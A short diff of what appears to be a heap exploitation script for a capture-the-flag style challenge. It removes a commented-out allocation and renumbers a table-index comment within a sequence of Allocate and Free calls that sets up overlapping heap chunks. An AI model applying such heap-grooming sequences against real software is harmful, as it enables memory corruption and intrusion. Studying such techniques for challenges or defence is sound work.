@@ -103,8 +103,6 @@ def main():
     Allocate(0x18)
     # table[3] -> chunk3 (0x31)
     Allocate(0x28)
-    ### table[4] -> chunk4 (0x21)
-    ### Allocate(0x18)
 
     # 0x20 : chunk1
     Free(1)
@@ -122,7 +120,7 @@ def main():
     # 0x80 : chunk1 (0x81)
     Free(4)
 
-    # table[5] -> chunk1 (0x81)
+    # table[4] -> chunk1 (0x81)
     Allocate(0x68)
 
     # chunk2, chunk3 recovery for free
